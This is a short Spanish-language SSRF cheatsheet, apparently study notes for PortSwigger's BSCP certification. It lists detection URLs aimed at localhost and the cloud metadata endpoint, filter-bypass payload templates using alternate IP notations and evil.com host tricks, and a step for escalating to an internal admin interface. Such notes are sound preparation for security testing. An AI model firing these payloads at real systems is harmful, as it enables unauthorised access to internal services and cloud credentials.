---
tipo: cheatsheet
vuln: ssrf
tags: [bscp, tipo/cheatsheet, vuln/ssrf]
relacionada: "[[SSRF]]"
---

# CS · SSRF

## Flujo repetible
1. Localiza un parámetro que acepte URL/host ({{PARAM}}).
2. Apunta a localhost/red interna o metadata.
3. Si hay filtro, ofusca. Si es ciego, confirma con {{COLLAB}}.

## Detección
```
http://127.0.0.1/{{ADMIN_PATH}}
http://169.254.169.254/latest/meta-data/     ⚠️ cloud
http://{{COLLAB}}/                            (blind, confirmación OAST)
```

## Plantillas de payload
```
# Bypass de filtros
http://127.1/     http://[::1]/     http://2130706433/
http://localhost#@evil.com     http://evil.com@127.0.0.1/     http://127.0.0.1.nip.io/
```

## Escalada al objetivo
SSRF a la interfaz admin interna → acción privilegiada (borrar usuario) / leer metadata.

## Checklist
- [ ] Probé localhost y notaciones alternativas
- [ ] Probé redirect a interno
- [ ] Confirmé SSRF ciego vía {{COLLAB}}

## Referencias
- https://portswigger.net/web-security/ssrf
